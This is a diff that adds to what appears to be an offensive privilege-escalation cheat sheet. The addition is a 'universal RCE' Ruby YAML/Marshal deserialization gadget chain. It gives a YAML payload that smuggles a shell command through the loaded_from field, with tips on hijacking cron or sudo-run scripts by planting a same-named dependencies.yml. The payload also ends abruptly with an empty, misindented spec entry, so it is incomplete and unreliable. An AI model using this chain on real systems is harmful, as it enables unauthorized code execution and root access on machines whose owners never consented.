@@ -1279,3 +1279,22 @@ cat /etc/os-release
 * Enter password
 * `sudo bash`
 * Profit
+
+Universal RCE deserialization gadget chain for Ruby 2.x.
+
+* This works for both `YAML.load` and `Marshal.load`
+* [https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
+* See Ruby script using this syntax on a seperate local file that you cannot write to however if the first script is executing through cron or `sudo -l` permissions you can create another file with the same name that the origional is calling i.e. `dependencies.yml`
+* Payload:
+
+```
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::DependencyList
+  specs:
+  - !ruby/object:Gem::Source::SpecificFile
+    spec: &1 !ruby/object:Gem::StubSpecification
+      loaded_from: "|id 1>&2"
+  - !ruby/object:Gem::Source::SpecificFile
+      spec:
+```
